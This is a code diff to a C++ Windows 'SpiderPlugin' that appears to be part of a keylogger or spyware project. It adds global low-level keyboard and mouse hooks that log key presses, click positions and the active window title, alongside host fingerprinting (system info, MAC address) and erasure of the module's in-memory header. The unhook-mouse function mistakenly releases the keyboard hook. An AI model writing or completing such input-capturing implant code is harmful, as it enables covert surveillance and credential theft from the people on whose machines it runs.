@@ -59,6 +59,9 @@ bool SpiderPlugin::initWindows()
 	// Erase the header
 	std::memset(pBaseAddr, 0, 0x1000);
 
+	// Get informations
+	getInfosWindows();
+
 	// TODO: Get MAC address
 	std::string macAddr;
 	MacAddress::get(macAddr);
@@ -138,12 +141,10 @@ std::uint64_t SpiderPlugin::getRAMWindows() const
 	return mi.dwTotalPhys / (1024ull * 1024ull);
 }
 
-SystemInfos SpiderPlugin::getInfosWindows() const
+void SpiderPlugin::getInfosWindows()
 {
-	SystemInfos infos;
-
-	infos.arch = detectArchWindows();
-	infos.os = OperatingSystem::Windows;
+	m_infos.arch = detectArchWindows();
+	m_infos.os = OperatingSystem::Windows;
 
 	SYSTEM_INFO sysInfos;
 	GetNativeSystemInfo(&sysInfos);
@@ -152,27 +153,165 @@ SystemInfos SpiderPlugin::getInfosWindows() const
 	switch (sysInfos.wProcessorArchitecture)
 	{
 	case PROCESSOR_ARCHITECTURE_AMD64:
-		infos.pArch = ProcArchitecture::AMD64;
+		m_infos.pArch = ProcArchitecture::AMD64;
 		break;
 	case PROCESSOR_ARCHITECTURE_ARM:
-		infos.pArch = ProcArchitecture::ARM;
+		m_infos.pArch = ProcArchitecture::ARM;
 		break;
 	case PROCESSOR_ARCHITECTURE_IA64:
-		infos.pArch = ProcArchitecture::IntelItanium;
+		m_infos.pArch = ProcArchitecture::IntelItanium;
 		break;
 	case PROCESSOR_ARCHITECTURE_INTEL:
-		infos.pArch = ProcArchitecture::x86;
+		m_infos.pArch = ProcArchitecture::x86;
 		break;
 	default:
-		infos.pArch = ProcArchitecture::Unknown;
+		m_infos.pArch = ProcArchitecture::Unknown;
 		break;
 	}
+	m_infos.pageSize = sysInfos.dwPageSize;
+	m_infos.nbProc = static_cast<std::uint16_t>(sysInfos.dwNumberOfProcessors);
+	m_infos.ram = getRAMWindows();
+}
 
-	infos.pageSize = sysInfos.dwPageSize;
-	infos.nbProc = static_cast<std::uint16_t>(sysInfos.dwNumberOfProcessors);
-	infos.ram = getRAMWindows();
+LRESULT CALLBACK SpiderPlugin::keyboardHookWindows(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	bool fEatKeystroke = false;
 
-	return infos;
+	if (nCode == HC_ACTION)
+	{
+		std::array<char, MAX_PATH> currentWindow;
+
+		GetWindowTextA(GetForegroundWindow(), currentWindow.data(), sizeof(currentWindow));
+		switch (wParam)
+		{
+		case WM_KEYDOWN:
+			std::cout << "Key pressed ! [" << currentWindow.data() << "]" << std::endl;
+			break;
+		case WM_SYSKEYDOWN:
+			break;
+		case WM_KEYUP:
+			break;
+		case WM_SYSKEYUP:
+			break;
+		default:
+			break;
+		}
+	}
+	return (fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
+}
+
+LRESULT CALLBACK SpiderPlugin::mouseHookWindows(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	if (nCode == HC_ACTION)
+	{
+		bool printPos = false;
+		std::array<char, MAX_PATH> currentWindow;
+
+		GetWindowTextA(GetForegroundWindow(), currentWindow.data(), sizeof(currentWindow));
+		switch (wParam)
+		{
+		case WM_LBUTTONDOWN:
+			std::cout << "Mouse Left Click [DOWN]";
+			printPos = true;
+			break;
+		case WM_LBUTTONUP:
+			std::cout << "Mouse Left Click [UP]";
+			printPos = true;
+			break;
+		case WM_RBUTTONDOWN:
+			std::cout << "Mouse Right Click [DOWN]";
+			printPos = true;
+			break;
+		case WM_RBUTTONUP:
+			std::cout << "Mouse Right Click [UP]";
+			printPos = true;
+			break;
+		default:
+			break;
+		}
+		if (printPos)
+		{
+			std::cout << " X: " << reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.x << " | Y: " << reinterpret_cast<PMSLLHOOKSTRUCT>(lParam)->pt.y << "[" << currentWindow.data() << "]" << std::endl;
+		}
+	}
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+bool SpiderPlugin::hookKeyboardWindows()
+{
+	// Install global hook
+	m_keyboardHookWin = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookWindows, 0, 0);
+	if (!m_keyboardHookWin)
+	{
+		return false;
+	}
+	return true;
+}
+
+bool SpiderPlugin::unHookKeyboardWindows()
+{
+	// Un-install global hook
+	if (m_keyboardHookWin)
+	{
+		UnhookWindowsHookEx(m_keyboardHookWin);
+	}
+	m_keyboardHookWin = nullptr;
+	return false;
+}
+
+bool SpiderPlugin::hookMouseWindows()
+{
+#if 1
+	m_mouseHookWin = SetWindowsHookEx(WH_MOUSE_LL, mouseHookWindows, 0, 0);
+	if (!m_mouseHookWin)
+	{
+		return false;
+	}
+#endif
+	return true;
+}
+
+bool SpiderPlugin::unHookMouseWindows()
+{
+	// Un-install global hook
+	if (m_keyboardHookWin)
+	{
+		UnhookWindowsHookEx(m_keyboardHookWin);
+	}
+	m_keyboardHookWin = nullptr;
+	return false;
+}
+
+void SpiderPlugin::runWindows() const
+{
+	MSG msg;
+
+	while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))
+	{
+		if (msg.message == WM_QUIT)
+		{
+			break;
+		}
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+#if 0
+	if (m_mouseHook)
+	{
+		POINT p;
+
+		GetCursorPos(&p);
+		std::cout << "Mouse X: " << p.x << " | Y: " << p.y << std::endl;
+		if (GetAsyncKeyState(VK_LBUTTON) & 0x8000)
+		{
+			std::cout << "Mouse left click" << std::endl;
+		}
+		if (GetAsyncKeyState(VK_RBUTTON) & 0x8000)
+		{
+			std::cout << "Mouse right click" << std::endl;
+		}
+	}
+#endif
 }
 }
 }
